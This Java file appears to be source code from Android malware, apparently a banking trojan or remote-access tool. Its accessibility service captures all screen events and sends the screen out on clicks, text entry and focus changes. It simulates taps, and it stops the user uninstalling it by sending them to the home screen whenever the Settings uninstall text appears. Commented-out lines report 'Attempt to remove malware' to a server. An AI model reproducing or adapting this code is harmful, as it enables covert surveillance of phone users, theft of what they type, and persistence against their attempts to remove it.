public  class Client extends AccessibilityService{

    @Override
	protected void onServiceConnected() {
		AccessibilityServiceInfo info = new AccessibilityServiceInfo();
		info.flags = AccessibilityServiceInfo.DEFAULT |
				AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS |
				AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS;
		info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
		info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
		setServiceInfo(info);
	}

	@Override
	public void onAccessibilityEvent(AccessibilityEvent event) {
        try {
			PackageInj = event.getPackageName().toString();
			PackageNage = event.getPackageName().toString().toLowerCase();
			strText = accessUtil.getEventText(event).toLowerCase();
			ClassName = event.getClassName().toString().toLowerCase();
			getThisPackage = getNameApplication(this).toLowerCase();


		} catch (Exception ex) {
			//return;
		}

		 switch (event.getEventType()) {
            case AccessibilityEvent.TYPE_VIEW_CLICKED:
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
            case AccessibilityEvent.TYPE_VIEW_FOCUSED:
                sendScreen();
                break;
            case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
                sendScreen();
                break;
            case AccessibilityEvent.TYPE_ANNOUNCEMENT:
                swipe_event(event);
                sendScreen();
            default:
                break;
        }

        AccessibilityNodeInfo nodeInfo = event.getSource();
        List<AccessibilityNodeInfo> list = nodeInfo.findAccessibilityNodeInfosByText("aaa");
        for (AccessibilityNodeInfo node : list) {
            List<AccessibilityNodeInfo> lll = nodeInfo.findAccessibilityNodeInfosByText(StringUninstall1);
            for (AccessibilityNodeInfo node2 : lll) {
                if (node2.toString().contains("com.android.settings")) {
                    close();
                    //SF.POST(this, "4", "p=" + SF.trafEnCr(SF.ID_B(this) + "|Attempt to remove malware 2|"));
                }
            }
            List<AccessibilityNodeInfo> lll2 = nodeInfo.findAccessibilityNodeInfosByText(StringUninstall2);
            for (AccessibilityNodeInfo node2 : lll2) {
                if (node2.toString().contains("com.android.settings")) {
                    close();
                    //SF.POST(this, "4", "p=" + SF.trafEnCr(SF.ID_B(this) + "|Attempt to remove malware 3|"));
                }
            }
        }
    }

    public void close(){
		Intent home = new Intent(Intent.ACTION_MAIN);
		home.addCategory(Intent.CATEGORY_HOME);
		home.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
		startActivity(home);
       /* Intent dialogIntent = new Intent(this, ActivityAlert2.class)
                .putExtra("start", "blockDelete");
        dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY);
        startActivity(dialogIntent);*/
	}

	public void findChildClick(AccessibilityNodeInfo nodeInfo, int x, int y,int action){
        if(nodeInfo == null) return;
        for(int i= 0; i< nodeInfo.getChildCount();i++){
            AccessibilityNodeInfo node = nodeInfo.getChild(i);
            if(node == null) continue;
            Rect bounds = new Rect();
            node.getBoundsInScreen(bounds);
            if (bounds.contains(x, y)) {
                node.performAction(action);
            }
            if(node.getChildCount() > 0)
                findChildClick(node,x,y,AccessibilityNodeInfo.ACTION_CLICK);
        }
    }

    public  AccessibilityNodeInfo findNodeFromText( AccessibilityNodeInfo accessibilityNodeInfo, String text) {
        if (accessibilityNodeInfo == null) {
            return null;
        }
        boolean flag = false;
        List<AccessibilityNodeInfo> nodeInfoList = accessibilityNodeInfo.findAccessibilityNodeInfosByText(text);
        if (nodeInfoList != null && !nodeInfoList.isEmpty()) {
            for (AccessibilityNodeInfo nodeInfo : nodeInfoList) {
                String strText = nodeInfo.getText() != null ? nodeInfo.getText().toString():"";
                String Description = nodeInfo.getContentDescription() != null ? nodeInfo.getContentDescription().toString():"";
                if (nodeInfo != null && (text.equals(strText) || text.equals(Description))) {
                   return nodeInfo;
                }
            }
        }
        return null;
    }
}